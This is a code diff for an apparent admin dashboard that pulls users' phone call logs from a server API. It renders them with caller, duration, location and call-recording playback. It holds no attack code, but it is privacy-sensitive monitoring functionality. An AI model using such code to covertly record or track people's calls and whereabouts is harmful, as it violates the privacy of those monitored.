+              return `<article class="call-card" data-item-id="${escapeHtml(it.itemId || "")}">
+          <div class="call-card-head">
+            <strong class="call-who">${who}</strong>
+            <span class="call-type ${typeCls}">${typeLabel}</span>
+          </div>
+          <div class="call-meta">
+            <time class="call-time">${when}</time>
+            <span class="call-duration">Duration ${dur}</span>
+            ${geo ? `<span class="call-geo">${escapeHtml(geo)}</span>` : ""}
+          </div>
+          ${playHtml ? `<div class="call-actions">${playHtml}</div>` : ""}
+        </article>`;
+            })
+            .join("")}</div>
+        </div>
+      </section>`;
+    })
+    .join("")}</div>`;
+}
+
+function wireAdminCallLogsList(list, items, deviceId) {
+  list.querySelectorAll(".call-day-header").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const group = btn.closest(".call-day-group");
+      const body = group?.querySelector(".call-day-body");
+      const chevron = btn.querySelector(".call-day-chevron");
+      if (!group || !body) return;
+      const opening = body.hasAttribute("hidden");
+      if (opening) {
+        body.removeAttribute("hidden");
+        group.classList.add("is-open");
+        btn.setAttribute("aria-expanded", "true");
+        if (chevron) chevron.textContent = "▲";
+      } else {
+        body.setAttribute("hidden", "");
+        group.classList.remove("is-open");
+        btn.setAttribute("aria-expanded", "false");
+        if (chevron) chevron.textContent = "▼";
+      }
+    });
+  });
+  list.querySelectorAll(".btn-call-play").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const itemId = btn.getAttribute("data-item-id") || "";
+      const devId = btn.getAttribute("data-device-id") || deviceId;
+      const row = (items || []).find((x) => String(x.itemId) === itemId);
+      playAdminCallRecording(devId, row || { itemId }, btn).catch((e) => {
+        alert(formatApiError(e));
+      });
+    });
+  });
+}
+
+async function refreshAdminCallLogsPanel() {
+  const list = document.getElementById("admin-call-logs-body");
+  if (!list || !exploreCtx) return;
+  const { ownerUid, deviceId } = exploreCtx;
+  list.textContent = "Loading call logs…";
+  list.classList.add("muted");
+  try {
+    const data = await api(
+      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/call-logs?limit=150`
+    );
+    const items = data.items || [];
+    if (!items.length) {
+      list.classList.add("muted");
+      list.textContent =
+        "No call logs yet.\n\nOn the phone: Permissions → Call logs → allow.\nThen Sync from phone.";
+      return;
+    }
+    list.classList.remove("muted");
+    list.innerHTML = renderCallLogsHtml(items, deviceId);
+    wireAdminCallLogsList(list, items, deviceId);
+  } catch (e) {
+    list.classList.add("muted");
+    list.textContent = formatApiError(e);
+  }
+}
+
 function renderCallLogsPanel() {
   const el = document.getElementById("admin-call-logs-body");
   if (!el || !exploreCtx) return;
-  document.getElementById("btn-admin-call-logs-refresh")?.addEventListener(
-    "click",
-    () => {
-      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
-    },
-    { once: true }
-  );
-  const items = sortNewestFirst(exploreCtx.data.callLogs || [], "date", "createdAt");
-  if (!items.length) {
-    el.innerHTML = emptyHint("No call logs cached. Tap Sync from phone.");
-    return;
-  }
-  el.innerHTML = `<ul class="admin-readable-list">${items
-    .slice(0, 50)
-    .map(
-      (c) =>
-        `<li>
-          <strong>${escapeHtml(c.number || c.cachedName || "Unknown")}</strong>
-          <span class="muted"> · ${escapeHtml(c.type || "")} · ${escapeHtml(String(c.duration ?? ""))}s</span>
-          <div class="muted">${fmtTime(c.date || c.createdAt)}</div>
-        </li>`
-    )
-    .join("")}</ul>`;
+  const refreshBtn = document.getElementById("btn-admin-call-logs-refresh");
+  if (refreshBtn) refreshBtn.onclick = () => void refreshAdminCallLogsPanel();
+  void refreshAdminCallLogsPanel();
 }
 
 function renderContactsPanel() {
